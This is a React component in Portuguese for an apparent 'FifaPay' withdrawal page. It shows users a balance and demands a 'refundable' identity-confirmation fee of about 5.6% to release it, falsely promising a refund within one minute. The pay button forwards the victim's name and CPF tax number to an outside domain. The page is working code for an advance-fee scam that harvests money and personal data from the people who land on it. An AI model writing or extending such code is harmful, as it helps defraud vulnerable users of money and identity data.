import { useEffect, useMemo, useState } from "react";
import { Check, Clock } from "lucide-react";
import logo from "@/assets/fifapay-logo.png";

const formatBRL = (n: number) => n.toFixed(2).replace(".", ",");

const Confirmacao = () => {
  const balance = useMemo(
    () => parseFloat(sessionStorage.getItem("fifapay:balance") || "0") || 0,
    []
  );
  const fullName = sessionStorage.getItem("fifapay:pixName") || "—";
  const pixType = sessionStorage.getItem("fifapay:pixType") || "CPF";
  const pixKey = sessionStorage.getItem("fifapay:pixKey") || "";

  const fee = useMemo(() => {
    // Taxa de ~5,6% do saldo (R$ 21,67 para R$ 387,01) com mínimo
    const calc = Math.max(5, Math.round(balance * 0.056 * 100) / 100);
    return calc;
  }, [balance]);

  const [now] = useState(() => new Date());
  const dataStr = `${String(now.getDate()).padStart(2, "0")}/${String(
    now.getMonth() + 1
  ).padStart(2, "0")}/${now.getFullYear()}, ${String(now.getHours()).padStart(
    2,
    "0"
  )}:${String(now.getMinutes()).padStart(2, "0")}`;

  const handlePay = () => {
    const nome = encodeURIComponent(fullName).replace(/%20/g, "+");
    const cpfParam = encodeURIComponent(pixType === "CPF" ? pixKey : "");
    window.location.href = `https://sistemaonlineplay.online/check/index.html?nome=${nome}&cpf=${cpfParam}`;
  };

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="min-h-dvh w-full bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950 text-white">
      <div className="mx-auto max-w-md px-5 pb-10 pt-5">
        {/* Logo */}
        <div className="mb-5 flex justify-center">
          <img
            src={logo}
            alt="FifaPay"
            className="h-12 w-auto select-none object-contain drop-shadow-[0_6px_14px_rgba(250,204,21,0.25)]"
            draggable={false}
          />
        </div>

        <div className="mb-5 h-px w-full bg-emerald-700/40" />

        {/* Saldo disponível */}
        <div className="mb-4 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5 shadow-inner">
          <p className="text-xs font-bold uppercase tracking-wider text-yellow-400/95">
            Saldo disponível
          </p>
          <p className="mt-3 text-4xl font-display font-bold tabular-nums text-white">
            R$ {formatBRL(balance)}
          </p>
          <p className="mt-3 text-sm text-emerald-200/75">
            Aguardando confirmação para saque
          </p>
        </div>

        {/* Confirmação de identidade */}
        <div className="mb-4 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <p className="text-xs font-bold uppercase tracking-wider text-emerald-300/85">
            Confirmação de identidade
          </p>
          <div className="mt-3 flex flex-wrap items-center gap-3">
            <span className="text-3xl font-display font-bold text-rose-400">
              R$ {formatBRL(fee)}
            </span>
            <span className="rounded-full border border-emerald-500/60 px-3 py-1 text-[10px] font-bold uppercase tracking-wider text-emerald-200">
              Valor reembolsável
            </span>
          </div>
          <p className="mt-3 text-sm leading-relaxed text-emerald-100/85">
            Taxa obrigatória para liberação do saque no valor de{" "}
            <span className="font-bold">R$ {formatBRL(balance)}</span>. O valor
            de <span className="font-bold">R$ {formatBRL(fee)}</span> será
            reembolsado integralmente para você em 1 minuto.
          </p>
        </div>

        {/* CTA principal */}
        <div className="mb-5 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <button
            type="button"
            onClick={handlePay}
            className="flex h-14 w-full items-center justify-center rounded-xl bg-gradient-to-r from-yellow-400 to-amber-400 text-base font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 transition-all hover:from-yellow-300 hover:to-amber-300 active:scale-[0.99]"
          >
            Pagar taxa para Liberar Saque
          </button>
          <p className="mt-3 flex items-center justify-center gap-1.5 text-xs font-medium text-emerald-200/80">
            <Clock className="h-3.5 w-3.5" />
            Reembolso automático em 1 minuto
          </p>
        </div>

        {/* Dados para reembolso */}
        <div className="mb-5 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <p className="mb-4 text-xs font-bold uppercase tracking-wider text-emerald-300/85">
            Dados para reembolso
          </p>
          <Row label="Nome" value={fullName} />
          <Row label="Data" value={dataStr} />
          <Row label="Chave PIX" value={pixType} />
          <Row
            label="Valor a receber"
            value={`R$ ${formatBRL(balance)}`}
            valueClass="text-yellow-300 font-bold"
          />
          <div className="mt-3 rounded-xl border border-emerald-700/40 bg-emerald-950/80 px-4 py-3 text-center font-mono text-sm tracking-wider text-emerald-50">
            {pixKey || "—"}
          </div>
        </div>

        <div className="mb-5 h-px w-full bg-emerald-700/40" />

        {/* Processo de liberação */}
        <div className="mb-5 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <p className="mb-4 text-xs font-bold uppercase tracking-wider text-emerald-300/85">
            Processo de liberação
          </p>

          <Step
            indicator={<span className="text-yellow-400 font-bold">1</span>}
            indicatorBg="bg-emerald-900/70 border border-yellow-400/50"
            title="Pagar taxa de confirmação"
            titleClass="text-white"
            subtitle={`R$ ${formatBRL(fee)} para verificação de identidade`}
          />
          <Step
            indicator={<Check className="h-4 w-4 text-emerald-300" strokeWidth={3} />}
            indicatorBg="bg-emerald-800/80 border border-emerald-400/50"
            title="Receber reembolso automático"
            titleClass="text-emerald-300"
            subtitle="Valor devolvido em 1 minuto"
          />
          <Step
            indicator={<span className="text-yellow-400 font-bold">3</span>}
            indicatorBg="bg-emerald-900/70 border border-yellow-400/50"
            title="Acessar saldo completo"
            titleClass="text-white"
            subtitle={`R$ ${formatBRL(balance)} liberado para saque`}
            isLast
          />
        </div>

        {/* CTA final (repetido) */}
        <div className="rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <button
            type="button"
            onClick={handlePay}
            className="flex h-14 w-full items-center justify-center rounded-xl bg-gradient-to-r from-yellow-400 to-amber-400 text-base font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 transition-all hover:from-yellow-300 hover:to-amber-300 active:scale-[0.99]"
          >
            Pagar taxa para Liberar Saque
          </button>
          <p className="mt-3 flex items-center justify-center gap-1.5 text-xs font-medium text-emerald-200/80">
            <Clock className="h-3.5 w-3.5" />
            Reembolso automático em 1 minuto
          </p>
        </div>
      </div>
    </div>
  );
};

const Row = ({
  label,
  value,
  valueClass = "text-white",
}: {
  label: string;
  value: string;
  valueClass?: string;
}) => (
  <div className="flex items-center justify-between border-b border-emerald-800/50 py-3 last:border-b-0">
    <span className="text-sm text-emerald-300/85">{label}</span>
    <span className={`text-sm ${valueClass}`}>{value}</span>
  </div>
);

const Step = ({
  indicator,
  indicatorBg,
  title,
  titleClass,
  subtitle,
  isLast = false,
}: {
  indicator: React.ReactNode;
  indicatorBg: string;
  title: string;
  titleClass: string;
  subtitle: string;
  isLast?: boolean;
}) => (
  <div className={`flex items-start gap-3 ${isLast ? "" : "mb-4"}`}>
    <div
      className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-lg ${indicatorBg}`}
    >
      {indicator}
    </div>
    <div className="min-w-0 flex-1 pt-0.5">
      <p className={`text-sm font-display font-bold ${titleClass}`}>{title}</p>
      <p className="mt-0.5 text-xs text-emerald-200/70">{subtitle}</p>
    </div>
  </div>
);

export default Confirmacao;